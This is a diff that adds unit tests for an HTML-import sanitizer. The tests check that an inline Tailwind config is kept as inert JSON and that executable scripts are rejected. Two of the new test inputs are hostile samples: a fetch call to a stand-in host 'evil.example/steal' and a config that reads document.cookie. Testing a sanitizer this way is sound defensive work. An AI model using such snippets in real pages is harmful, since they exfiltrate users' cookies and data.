@@ -71,6 +71,59 @@ describe('screenshot HTML import', () => {
     expect(workbench.createFile).toHaveBeenCalledWith('/home/project/screenshot-generated.html', css);
   });
 
+  it('keeps the inline Tailwind config as inert JSON instead of dropping the palette and fonts', async () => {
+    const workbench = project();
+
+    // Shape measured on the deployed backend: one inline script, pure `tailwind.config = {...}`.
+    const generated =
+      '<!doctype html><html><head><script src="https://cdn.tailwindcss.com"></script>' +
+      "<script>\n  tailwind.config = {\n    theme: { extend: { colors: { ink:'#171719', lime:'#c8f169' }," +
+      " fontFamily:{ sans:['Inter','ui-sans-serif'] } } }\n  }\n</script>" +
+      '</head><body><h1 class="text-ink">Generated</h1></body></html>';
+
+    await importScreenshotHtml(generated, workbench);
+
+    const written = workbench.createFile.mock.calls[0][1] as unknown as string;
+
+    // No executable script survives...
+    expect(written).not.toMatch(/<script(?![^>]*application\/json)/i);
+    expect(written).not.toContain('tailwind.config =');
+
+    // ...but the configuration is still in the file, as data.
+    expect(written).toContain('type="application/json"');
+    expect(written).toContain('"#c8f169"');
+    expect(written).toContain('"Inter"');
+    expect(written).toContain('text-ink');
+  });
+
+  it('rejects a real inline script even when a page also carries a Tailwind config', async () => {
+    const workbench = project();
+
+    const mixed =
+      "<!doctype html><html><head><script>tailwind.config = { theme: { colors: { a: '#fff' } } };</script>" +
+      '<script>fetch("https://evil.example/steal")</script></head><body><p>x</p></body></html>';
+
+    await expect(importScreenshotHtml(mixed, workbench)).rejects.toThrow(/inline script/i);
+    expect(workbench.createFile).not.toHaveBeenCalled();
+  });
+
+  it('rejects a config that escapes into code (function, DOM access, template literal)', async () => {
+    const workbench = project();
+
+    const sneaky =
+      '<!doctype html><html><head><script>tailwind.config = { theme: { extend: { x: document.cookie } } };</script>' +
+      '</head><body><p>x</p></body></html>';
+
+    await expect(importScreenshotHtml(sneaky, workbench)).rejects.toThrow(/inline script/i);
+
+    const fn =
+      '<!doctype html><html><head><script>tailwind.config = { theme: { extend: { x: (() => 1)() } } };</script>' +
+      '</head><body><p>x</p></body></html>';
+
+    await expect(importScreenshotHtml(fn, workbench)).rejects.toThrow(/inline script/i);
+    expect(workbench.createFile).not.toHaveBeenCalled();
+  });
+
   it('does not report success if file creation fails', async () => {
     const workbench = project();
     workbench.createFile.mockResolvedValueOnce(false);
